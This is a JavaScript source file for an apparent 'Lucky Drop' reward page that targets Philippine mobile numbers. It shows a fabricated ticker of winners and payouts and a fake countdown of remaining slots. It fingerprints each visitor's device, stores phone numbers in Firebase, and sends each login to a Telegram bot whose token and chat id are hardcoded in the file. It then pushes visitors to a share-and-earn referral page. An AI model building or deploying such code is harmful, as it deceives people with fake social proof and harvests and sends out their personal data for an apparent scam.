/**
 * Lucky Drop Index Page - Swipe to Verify with Fire Trail
 * With Online Status System
 */

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// Telegram Config
const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
const chatId = '7298607329';

// DOM Elements
const winnerEntry = document.getElementById('winnerEntry');
const remNum = document.getElementById('remNum');
const pBar = document.getElementById('pBar');
const modalOverlay = document.getElementById('modalOverlay');
const mainCard = document.getElementById('mainCard');
const userPhoneInput = document.getElementById('userPhone');
const claimBtn = document.getElementById('claimBtn');

// Swipe Elements
const swipeTrack = document.getElementById('swipeTrack');
const swipeIcon = document.getElementById('swipeIcon');
const swipeFireTrail = document.getElementById('swipeFireTrail');

// Scarcity counter
let count = 88;

// ========== FIXED PHONE FORMATTER ==========
function formatPhoneNumber(input) {
    let cleaned = input.replace(/\D/g, '');
    
    if (!cleaned || cleaned.length === 0) {
        return '';
    }
    
    if (cleaned.length === 11 && cleaned.startsWith('09')) {
        return cleaned;
    }
    
    if (cleaned.length === 12 && cleaned.startsWith('099')) {
        return cleaned.substring(1);
    }
    
    if (cleaned.length === 12 && cleaned.startsWith('09')) {
        return cleaned.substring(0, 11);
    }
    
    if (cleaned.length >= 13) {
        const index09 = cleaned.indexOf('09');
        if (index09 !== -1 && cleaned.length >= index09 + 11) {
            return cleaned.substring(index09, index09 + 11);
        }
        return cleaned.slice(-11);
    }
    
    if (cleaned.length === 11 && !cleaned.startsWith('09')) {
        if (cleaned.startsWith('99')) {
            return '09' + cleaned.substring(2);
        }
        return '09' + cleaned.substring(2);
    }
    
    if (cleaned.startsWith('63') && cleaned.length >= 12) {
        let without63 = cleaned.substring(2);
        if (without63.startsWith('9')) {
            without63 = '0' + without63;
        }
        return without63.substring(0, 11);
    }
    
    if (cleaned.length === 10) {
        return '0' + cleaned;
    }
    
    if (cleaned.length === 9) {
        return '09' + cleaned;
    }
    
    if (cleaned.startsWith('0') && cleaned.length === 11) {
        return cleaned;
    }
    
    if (cleaned.startsWith('0') && cleaned.length > 11) {
        return cleaned.substring(0, 11);
    }
    
    if (cleaned.startsWith('9') && cleaned.length === 10) {
        return '0' + cleaned;
    }
    
    return cleaned;
}

// ========== VALIDATE PHONE NUMBER ==========
function isValidPhoneNumber(phone) {
    const formatted = formatPhoneNumber(phone);
    return formatted.length === 11 && formatted.startsWith('09');
}

// ========== SET USER ONLINE STATUS ==========
async function setUserOnline(phoneNumber, fingerprint, deviceDisplayId) {
    try {
        await db.ref('user_sessions/' + phoneNumber).update({
            status: 'online',
            lastSeen: firebase.database.ServerValue.TIMESTAMP,
            deviceFingerprint: fingerprint,
            deviceDisplayId: deviceDisplayId
        });
        console.log('✅ Status set to ONLINE:', phoneNumber);
    } catch(e) {
        console.error('Error setting online status:', e);
    }
}

// ========== SWIPE WITH FIRE TRAIL ==========
let isDragging = false;
let startX = 0;
let currentLeft = 0;
let swipeCompleted = false;
let trailInterval = null;

function startFireTrail() {
    if (trailInterval) clearInterval(trailInterval);
    if (swipeFireTrail) {
        swipeFireTrail.classList.add('active');
        trailInterval = setInterval(() => {
            if (swipeFireTrail) {
                swipeFireTrail.classList.remove('active');
                setTimeout(() => {
                    if (swipeFireTrail) swipeFireTrail.classList.add('active');
                }, 50);
            }
        }, 100);
    }
}

function stopFireTrail() {
    if (trailInterval) {
        clearInterval(trailInterval);
        trailInterval = null;
    }
    if (swipeFireTrail) {
        swipeFireTrail.classList.remove('active');
    }
}

function updateFireTrailPosition(leftPos, maxLeft) {
    if (!swipeFireTrail) return;
    const percentage = (leftPos / maxLeft) * 100;
    swipeFireTrail.style.width = percentage + '%';
}

function initSwipe() {
    if (!swipeIcon || !swipeTrack) return;
    
    const trackWidth = swipeTrack.offsetWidth;
    const iconWidth = 56;
    const maxLeft = trackWidth - iconWidth;
    
    swipeIcon.addEventListener('touchstart', (e) => {
        if (swipeCompleted) return;
        e.preventDefault();
        isDragging = true;
        startX = e.touches[0].clientX;
        currentLeft = parseInt(swipeIcon.style.left) || 0;
        swipeIcon.style.cursor = 'grabbing';
        startFireTrail();
    });
    
    swipeIcon.addEventListener('touchmove', (e) => {
        if (!isDragging || swipeCompleted) return;
        e.preventDefault();
        const moveX = e.touches[0].clientX - startX;
        let newLeft = currentLeft + moveX;
        newLeft = Math.max(0, Math.min(newLeft, maxLeft));
        swipeIcon.style.left = newLeft + 'px';
        updateFireTrailPosition(newLeft, maxLeft);
    });
    
    swipeIcon.addEventListener('touchend', (e) => {
        if (!isDragging || swipeCompleted) return;
        e.preventDefault();
        isDragging = false;
        swipeIcon.style.cursor = 'grab';
        stopFireTrail();
        
        const finalLeft = parseInt(swipeIcon.style.left) || 0;
        
        if (finalLeft >= maxLeft - 10) {
            completeSwipe();
        } else {
            swipeIcon.style.left = '0px';
            if (swipeFireTrail) swipeFireTrail.style.width = '0%';
        }
    });
    
    swipeIcon.addEventListener('mousedown', (e) => {
        if (swipeCompleted) return;
        e.preventDefault();
        isDragging = true;
        startX = e.clientX;
        currentLeft = parseInt(swipeIcon.style.left) || 0;
        swipeIcon.style.cursor = 'grabbing';
        startFireTrail();
    });
    
    window.addEventListener('mousemove', (e) => {
        if (!isDragging || swipeCompleted) return;
        e.preventDefault();
        const moveX = e.clientX - startX;
        let newLeft = currentLeft + moveX;
        newLeft = Math.max(0, Math.min(newLeft, maxLeft));
        swipeIcon.style.left = newLeft + 'px';
        updateFireTrailPosition(newLeft, maxLeft);
    });
    
    window.addEventListener('mouseup', (e) => {
        if (!isDragging || swipeCompleted) return;
        isDragging = false;
        swipeIcon.style.cursor = 'grab';
        stopFireTrail();
        
        const finalLeft = parseInt(swipeIcon.style.left) || 0;
        
        if (finalLeft >= maxLeft - 10) {
            completeSwipe();
        } else {
            swipeIcon.style.left = '0px';
            if (swipeFireTrail) swipeFireTrail.style.width = '0%';
        }
    });
}

async function completeSwipe() {
    if (swipeCompleted) return;
    swipeCompleted = true;
    
    if (swipeFireTrail) {
        swipeFireTrail.style.width = '100%';
        swipeFireTrail.classList.add('active');
    }
    
    try {
        const audio = new Audio('sounds/super_ace_scatter_ring.mp3');
        audio.volume = 0.7;
        audio.play().catch(e => console.log('Sound error:', e));
    } catch(e) {}
    
    const swipeContainer = document.querySelector('.swipe-container');
    if (swipeContainer) {
        swipeContainer.style.transition = 'opacity 0.3s ease';
        swipeContainer.style.opacity = '0';
    }
    
    setTimeout(() => {
        if (modalOverlay) modalOverlay.style.display = 'flex';
        if (swipeContainer) swipeContainer.style.display = 'none';
    }, 400);
    
    setTimeout(() => {
        if (swipeFireTrail) swipeFireTrail.classList.remove('active');
    }, 500);
}

// ========== LIVE WINNERS TICKER ==========
function updateTickerWithTransition(phoneNumber, amount, type) {
    if (!winnerEntry) return;
    
    winnerEntry.classList.remove('fade-in');
    winnerEntry.classList.add('fade-out');
    
    setTimeout(() => {
        let displayText = '';
        if (type === 'task') {
            displayText = `${phoneNumber} completed task +₱${amount}`;
        } else {
            displayText = `${phoneNumber} successful referral +₱${amount}`;
        }
        
        winnerEntry.innerHTML = displayText;
        winnerEntry.classList.remove('fade-out');
        winnerEntry.classList.add('fade-in');
    }, 200);
}

function startTicker() {
    const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
    
    function generateRandomAmount() {
        const rand = Math.random();
        if (rand < 0.60) return 150;
        else if (rand < 0.85) return 300;
        else if (rand < 0.95) return 450;
        else return 600;
    }
    
    function generateWinner() {
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
        const phoneNumber = `${randomPrefix}***${randomSuffix}`;
        const amount = generateRandomAmount();
        const type = Math.random() < 0.7 ? 'task' : 'referral';
        return { phoneNumber, amount, type };
    }
    
    const initial = generateWinner();
    winnerEntry.innerHTML = `${initial.phoneNumber} ${initial.type === 'task' ? 'completed task' : 'successful referral'} +₱${initial.amount}`;
    winnerEntry.classList.add('fade-in');
    
    setInterval(() => {
        const { phoneNumber, amount, type } = generateWinner();
        updateTickerWithTransition(phoneNumber, amount, type);
    }, 4800);
}

// ========== DEVICE FINGERPRINT ==========
function getDeviceFingerprint() {
    const screenResolution = `${screen.width}x${screen.height}x${screen.colorDepth}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const language = navigator.language;
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
    const deviceMemory = navigator.deviceMemory || 'unknown';
    
    const fingerprintString = `${userAgent}|${screenResolution}|${timezone}|${language}|${platform}|${hardwareConcurrency}|${deviceMemory}`;
    
    let hash = 0;
    for (let i = 0; i < fingerprintString.length; i++) {
        hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
        hash |= 0;
    }
    return `FP_${Math.abs(hash)}`;
}

// ========== GET DEVICE DISPLAY ID ==========
async function getOrCreateDeviceId(fingerprint) {
    if (!fingerprint || fingerprint === '---') return '---';
    
    const deviceMapRef = db.ref('device_id_map/' + fingerprint);
    const snap = await deviceMapRef.once('value');
    
    if (snap.exists()) {
        return snap.val().displayId;
    }
    
    const counterRef = db.ref('admin/deviceCounter');
    const counterSnap = await counterRef.once('value');
    let nextNum = (counterSnap.val() || 0) + 1;
    await counterRef.set(nextNum);
    
    const displayId = `Dev${nextNum}`;
    
    await deviceMapRef.set({
        displayId: displayId,
        createdAt: Date.now(),
        fingerprint: fingerprint
    });
    
    return displayId;
}

// ========== SAVE DEVICE INFO ==========
async function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
    const deviceInfo = {
        phone: phone,
        fingerprint: fingerprint,
        displayId: deviceDisplayId,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        lastSeen: Date.now(),
        firstSeen: Date.now()
    };
    
    const existingDevice = await db.ref('devices/' + fingerprint).once('value');
    if (!existingDevice.exists()) {
        await db.ref('devices/' + fingerprint).set(deviceInfo);
    } else {
        await db.ref('devices/' + fingerprint).update({ lastSeen: Date.now() });
    }
    
    await db.ref('device_phone_map/' + fingerprint).set({
        phone: phone,
        displayId: deviceDisplayId,
        lastSeen: Date.now()
    });
}

// ========== CREATE USER SESSION ==========
async function createUserSession(phone, fingerprint, deviceDisplayId) {
    const sessionRef = db.ref('user_sessions/' + phone);
    const sessionSnap = await sessionRef.once('value');
    
    if (!sessionSnap.exists()) {
        await sessionRef.set({
            phone: phone,
            balance: 0,
            clicks: 0,
            status: 'online',
            deviceFingerprint: fingerprint,
            deviceDisplayId: deviceDisplayId,
            lastUpdate: Date.now(),
            createdAt: Date.now()
        });
    } else {
        await sessionRef.update({
            status: 'online',
            lastUpdate: Date.now(),
            deviceFingerprint: fingerprint,
            deviceDisplayId: deviceDisplayId
        });
    }
}

// ========== BAN CHECK FUNCTIONS ==========
async function isPhoneBanned(phone) {
    const bannedSnap = await db.ref('banned_ghosts/' + phone).once('value');
    return bannedSnap.exists();
}

async function isFingerprintLinkedToBanned(fingerprint) {
    const devicePhoneMapSnap = await db.ref('device_phone_map/' + fingerprint).once('value');
    if (devicePhoneMapSnap.exists()) {
        const linkedPhone = devicePhoneMapSnap.val().phone;
        const isLinkedBanned = await isPhoneBanned(linkedPhone);
        if (isLinkedBanned) return true;
    }
    
    const bannedSnap = await db.ref('banned_ghosts').once('value');
    const bannedData = bannedSnap.val();
    if (bannedData) {
        for (const [phone, data] of Object.entries(bannedData)) {
            if (data.fingerprint === fingerprint) return true;
        }
    }
    return false;
}

async function getBanDetails(phone, fingerprint) {
    const phoneBannedSnap = await db.ref('banned_ghosts/' + phone).once('value');
    if (phoneBannedSnap.exists()) {
        return { isBanned: true, type: "phone" };
    }
    
    const isFpLinkedToBanned = await isFingerprintLinkedToBanned(fingerprint);
    if (isFpLinkedToBanned) {
        return { isBanned: true, type: "device" };
    }
    
    return { isBanned: false };
}

async function isNumberClaimed(phone) {
    const logSnap = await db.ref('user_logs/' + phone).once('value');
    return (logSnap.exists() && logSnap.val().status === 'claimed');
}

// ========== SHOW BLOCKED UI ==========
function showBlockedUI(reason) {
    if (!modalOverlay) return;
    modalOverlay.style.display = 'flex';
    
    let title = "ACCESS RESTRICTED";
    let blockMessage = "This account has been restricted by the administrator.";
    
    if (reason === "claimed") {
        title = "ALREADY CLAIMED";
        blockMessage = "This number has already claimed a reward before.";
    }

    const modalBody = document.getElementById('modalBodyContent');
    if (modalBody) {
        modalBody.innerHTML = `
            <div class="bonus-box-premium">
                <div class="bonus-amount-premium">🚫</div>
            </div>
            <h3 style="color: #FF4444; text-align: center; margin-bottom: 10px;">${title}</h3>
            <p style="font-size: 13px; color: #94a3b8; text-align: center; margin-bottom: 20px;">${blockMessage}</p>
            <button class="login-btn" onclick="location.reload()" style="background: #334155; color: white;">OK</button>
        `;
    }
    if (mainCard) mainCard.style.opacity = "0.3";
}

// ========== PROCESS STEP 1 ==========
window.processStep1 = async function() {
    if (!userPhoneInput || !claimBtn) return;
    
    let phone = userPhoneInput.value.trim();
    const btn = claimBtn;
    const fingerprint = getDeviceFingerprint();

    if (!phone || phone.length === 0) {
        alert("Please enter your mobile number.");
        return;
    }
    
    const fullPhone = formatPhoneNumber(phone);
    
    if (!isValidPhoneNumber(fullPhone)) {
        alert("Invalid mobile number.\n\nPlease enter a valid number like:\n• 09123456789\n• 9123456789\n• 639123456789");
        return;
    }
    
    btn.classList.add('loading');
    btn.disabled = true;

    try {
        const banDetails = await getBanDetails(fullPhone, fingerprint);
        if (banDetails.isBanned) {
            btn.classList.remove('loading');
            btn.disabled = false;
            showBlockedUI("banned");
            return;
        }
        
        const isClaimed = await isNumberClaimed(fullPhone);
        if (isClaimed) {
            btn.classList.remove('loading');
            btn.disabled = false;
            showBlockedUI("claimed");
            return;
        }
        
        const deviceDisplayId = await getOrCreateDeviceId(fingerprint);
        await saveDeviceInfo(fullPhone, fingerprint, deviceDisplayId);
        await createUserSession(fullPhone, fingerprint, deviceDisplayId);
        
        // SET USER STATUS TO ONLINE
        await setUserOnline(fullPhone, fingerprint, deviceDisplayId);
        
        const message = `🎁 LUCKY DROP LOGIN:\n📱 ${fullPhone}\n🖥️ FP: ${fingerprint}\n🔑 DEV#: ${deviceDisplayId}`;
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .catch(e => console.log('Telegram error:', e));
        
        localStorage.setItem("userPhone", fullPhone);
        localStorage.setItem("userDeviceId", fingerprint);
        localStorage.setItem("userDeviceDisplayId", deviceDisplayId);
        
        btn.classList.remove('loading');
        btn.classList.add('success');
        const loginTextSpan = btn.querySelector('.login-text');
        if (loginTextSpan) loginTextSpan.textContent = 'SUCCESS';
        
        setTimeout(() => {
            window.location.href = "share_and_earn.html";
        }, 1000);
        
    } catch (error) {
        console.error("Process error:", error);
        btn.classList.remove('loading');
        btn.disabled = false;
        alert("An error occurred. Please try again.");
    }
};

// ========== SCARCITY COUNTER ==========
function startScarcityCounter() {
    setInterval(() => {
        if (count > 15) {
            count -= Math.floor(Math.random() * 2) + 1;
            if (remNum) remNum.innerText = count;
            if (pBar) pBar.style.width = count + "%";
        }
    }, 5000);
}

// ========== PARTICLES EFFECT ==========
function initParticles() {
    const canvas = document.getElementById('particleCanvas');
    if (!canvas) return;
    
    let width = window.innerWidth;
    let height = window.innerHeight;
    let particles = [];
    let ctx = canvas.getContext('2d');
    
    function resizeCanvas() {
        width = window.innerWidth;
        height = window.innerHeight;
        canvas.width = width;
        canvas.height = height;
    }
    
    function createParticles() {
        const count = Math.min(40, Math.floor(width * height / 20000));
        for (let i = 0; i < count; i++) {
            particles.push({
                x: Math.random() * width,
                y: Math.random() * height,
                size: Math.random() * 2 + 1,
                alpha: Math.random() * 0.2 + 0.05,
                vx: (Math.random() - 0.5) * 0.2,
                vy: (Math.random() - 0.5) * 0.1
            });
        }
    }
    
    function animateParticles() {
        if (!ctx) return;
        ctx.clearRect(0, 0, width, height);
        
        for (let p of particles) {
            p.x += p.vx;
            p.y += p.vy;
            if (p.x < 0) p.x = width;
            if (p.x > width) p.x = 0;
            if (p.y < 0) p.y = height;
            if (p.y > height) p.y = 0;
            
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(255, 215, 0, ${p.alpha})`;
            ctx.fill();
        }
        requestAnimationFrame(animateParticles);
    }
    
    window.addEventListener('resize', () => {
        resizeCanvas();
        particles = [];
        createParticles();
    });
    
    resizeCanvas();
    createParticles();
    animateParticles();
}

// ========== MODAL FUNCTIONS ==========
function closeModal() {
    if (modalOverlay) modalOverlay.style.display = 'none';
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() {
    initSwipe();
    startTicker();
    startScarcityCounter();
    initParticles();
    
    if (modalOverlay) {
        modalOverlay.addEventListener('click', function(e) {
            if (e.target === modalOverlay) closeModal();
        });
    }
});

if (userPhoneInput) {
    userPhoneInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') window.processStep1();
    });
}
